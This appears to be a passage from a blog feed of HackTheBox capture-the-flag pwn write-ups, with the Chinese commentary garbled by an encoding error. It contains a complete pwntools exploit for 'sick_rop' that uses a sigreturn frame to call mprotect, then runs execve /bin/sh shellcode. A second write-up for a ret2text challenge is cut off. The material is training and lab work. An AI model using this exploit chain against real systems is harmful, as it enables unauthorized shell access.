&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401012 : and al, 0x10 ; syscall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000000000040100d : and al, 8 ; mov rdx, qword ptr [rsp + 0x10] ; syscall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401044 : call qword ptr [rax + 0x41]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000000000040104c : dec ecx ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000000000040100c : je 0x401032 ; or byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; syscall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401023 : je 0x401049 ; or byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; syscall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401054 : jmp 0x40104f&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000000000040104d : leave ; ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401010 : mov edx, dword ptr [rsp + 0x10] ; syscall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000000000040100b : mov esi, dword ptr [rsp + 8] ; mov rdx, qword ptr [rsp + 0x10] ; syscall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000000000040100f : mov rdx, qword ptr [rsp + 0x10] ; syscall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000000000040100e : or byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; syscall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401011 : push rsp ; and al, 0x10 ; syscall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401016 : ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401049 : retf 0xffff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000000000401014 : syscall&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæ‹–å…¥ ida å‘ç°å°± 4 ä¸ªåŠŸèƒ½ï¼Œç¬¬ä¸€æ¬¡ç¢°åˆ°&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;void __fastcall __noreturn start(int a1, int a2, int a3, int a4, int a5, int a6)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  while ( 1 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    vuln(a1, a2, a3, a4, a5, a6);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;å¯åŠ¨å†™äº†ä¸€ä¸ªæ­»å¾ªç¯ä¸€ç›´è°ƒç”¨ vuln&lt;/p&gt;
&lt;p&gt;è€Œ vuln æ¨¡å—çš„è¯&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall vuln(int a1, int a2, int a3, int a4, int a5, int a6)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size_t v6; // rax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v7; // edx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v8; // ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v9; // er8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v10; // er9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  const char *v11; // r10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char v13[32]; // [rsp+0h] [rbp-20h] BYREF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v6 = read(a1, a2, a3, a4, a5, a6, v13, 0x300uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return write(a1, a2, v7, v8, v9, v10, v11, v6);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;è°ƒç”¨äº† read å’Œ write å‡½æ•°ï¼Œ&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ—¶å€™æ„é€ æˆ srop&lt;/p&gt;
&lt;h4 id=&#34;exp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exp&#34;&gt;#&lt;/a&gt; exp&lt;/h4&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&amp;#x27;./sick_rop&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if args.R:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; p = remote(&amp;quot;*.*.*.*&amp;quot;,30479)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; p = elf.process()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.clear(arch=&amp;#x27;amd64&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;syscall_ret = 0x401014&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;read = 0x401000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writable = 0x400000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_ret = 0x400018&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vuln = elf.sym.vuln&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;A&amp;#x27;*40    # to our offset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload += p64(vuln)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload += p64(syscall_ret)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;frame = SigreturnFrame(kernel=&amp;quot;amd64&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;frame.rax = 0xa     # syscall for mprotect()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;frame.rdi = writable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;frame.rsi = 0x4000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;frame.rdx = 0x7    # rwx (read ,write , execute)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;frame.rsp = 0x4010d8 # this will be our new stack kind of ie addr 0x400...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;frame.rip = syscall_ret&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload += bytes(frame) # fake sigreturnframe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# sending&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recv()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;B&amp;#x27;* (0xf - 1 ) # sigret 15 syscall&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recv()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# shellcode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shell_code = b&amp;quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = shell_code.ljust(40, b&amp;#x27;A&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload += p64(0x4010b8)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;[*] Sending second stage payload with &amp;#123;&amp;#125; bytes ...&amp;#x27;.format(len(payload)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
</content>
        <category term="PWN" />
        <updated>2023-12-13T11:04:07.000Z</updated>
    </entry>
    <entry>
        <id>https://lookhui.github.io/HTB-You-know-0xDiablos-md/</id>
        <title>HTB-You_know_0xDiablos</title>
        <link rel="alternate" href="https://lookhui.github.io/HTB-You-know-0xDiablos-md/"/>
        <content type="html">&lt;h1 id=&#34;you-know-0xdiablos&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#you-know-0xdiablos&#34;&gt;#&lt;/a&gt; You know 0xDiablos&lt;/h1&gt;
&lt;p&gt;è¿™ä¸ªé¢˜çœŸçš„å¾ˆç®€å•ä¸€ä¸ª ret2text&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Arch:     i386-32-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RELRO:    Partial RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Stack:    No canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NX:       NX disabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PIE:      No PIE (0x8048000)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RWX:      Has RWX segments&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;åˆæ˜¯ä¸€ä¸ª 32 ä½çš„ç¨‹åºä½¿ç”¨ strings&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tdX&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/lib/ld-linux.so.2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.so.6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_IO_stdin_used&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fopen&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;printf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fgets&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stdout&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;setresgid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getegid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;setvbuf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__libc_start_main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GLIBC_2.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GLIBC_2.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__gmon_start__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[^_]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Hurry up and try in on server side.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;You know who are 0xDiablos:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;*2$&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GCC: (Debian 8.3.0-19) 8.3.0&lt;/span&gt;&lt;br&gt;&lt;span 